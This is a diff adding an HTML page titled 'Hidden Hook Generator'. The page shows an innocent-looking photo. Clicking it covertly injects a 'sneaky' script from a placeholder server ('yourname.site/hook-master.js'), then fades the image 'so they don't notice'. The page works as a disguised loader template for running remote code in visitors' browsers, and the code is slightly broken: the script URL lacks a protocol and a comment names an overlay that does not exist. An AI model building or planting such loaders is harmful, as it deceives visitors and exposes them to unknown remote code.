@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Hidden Hook Generator</title>
+
+<style>
+  /* This makes the image look like a normal photo */
+  body {
+    background: white;
+    display: flex;
+    justify-content: center;
+  }
+
+  .main-img {
+    width: 200px;
+    height: 200px;
+    object-fit: cover;
+  }
+</style>
+</head>
+
+<body>
+
+<!--
+  INSTRUCTION: Replace 'my-photo.jpg' with your actual image file.
+  The 'overlay' div is where the magic happens.
+-->
+
+<img src="my-photo.jpg" class="main-img" id="my-photo" alt="The Hook">
+
+<!-- This script waits for a click anywhere on the image -->
+<script>
+  const mainImage = document.getElementById('my-photo');
+
+  mainImage.addEventListener('click', function() {
+    // 1. First, load a 'sneaky' script from your server or a CDN
+    // We use yourname.site/hook as the destination URL
+    const script = document.createElement('script');
+
+    script.src = 'yourname.site/hook-master.js'; // Change this to your main logic
+
+    document.body.appendChild(script);
+
+    // 2. Optional: Make the image fade out so they don't notice it anymore
+    mainImage.style.opacity = '0.5';
+  });
+</script>
+
+</body>
+</html>
